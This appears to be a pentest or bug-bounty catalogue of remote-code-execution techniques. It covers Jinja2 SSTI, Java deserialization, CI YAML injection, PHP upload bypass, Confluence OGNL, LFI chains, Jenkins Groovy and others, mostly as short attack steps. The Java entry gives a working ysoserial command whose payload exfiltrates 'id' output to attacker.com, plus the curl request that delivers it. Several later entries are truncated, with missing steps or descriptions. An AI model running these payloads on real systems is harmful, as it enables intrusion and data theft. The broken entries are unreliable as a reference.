title: RCE via SSTI in Jinja2
desc: User input passed into Jinja2 template. Confirmed with {{7*7}}=49, escalated to RCE.
steps:
1. Inject {{7*7}} — look for 49
2. Confirm Jinja2
3. Use RCE payload

title: RCE via Java deserialization
desc: API accepted serialized Java objects. ysoserial payload triggered RCE on deserialization.
steps:
1. Identify endpoint accepting serialized Java
2. Generate ysoserial payload
3. Send — command executes
payload:
java -jar ysoserial.jar CommonsCollections6 'curl https://attacker.com/$(id)' > p.ser
curl -X POST https://target.com/api/import --data-binary @p.ser -H 'Content-Type: application/x-java-serialized-object'

title: RCE via CI YAML injection
desc: GitLab CI config partially user-controlled. Injecting YAML added arbitrary jobs on runner.
steps:
1. Find user input merged into .gitlab-ci.yml
2. Inject YAML job with malicious script
3. Pipeline runs — command executes

title: RCE via PHP upload extension bypass
desc: Upload checked extension not MIME. .php5 bypassed blacklist and executed as PHP.
steps:
1. Upload shell.php5
2. Server stores in web-accessible dir
3. Access URL — PHP executes

title: RCE via OGNL injection CVE-2022-26134
desc: Unauthenticated OGNL injection in Confluence Server via HTTP request URI.
steps:
1. Send GET with OGNL payload in URI
2. Expression evaluated server-side
3. Command executes as confluence user

title: RCE via prototype pollution gadget

steps:

2. Identify spawn/exec gadget
3. Pollute with shell options

title: RCE via ImageMagick MSL injection
desc: Image processing used ImageMagick. SVG with MSL directives triggered command execution.
steps:

title: RCE via LFI + file upload chain
desc: File upload + LFI in separate endpoint. Attacker included uploaded PHP file via LFI.
steps:
1. Upload PHP webshell
2. Find LFI: ?page=../../uploads/shell
3. LFI includes PHP — RCE

title: RCE via Jenkins Groovy script console
desc: Jenkins script console accessible without auth. Groovy executed OS commands.
steps:

2. Enter Groovy payload
3. Execute — runs as jenkins user

title: RCE via vCenter SSRF to JSP webshell

title: RCE via admin integration script injection
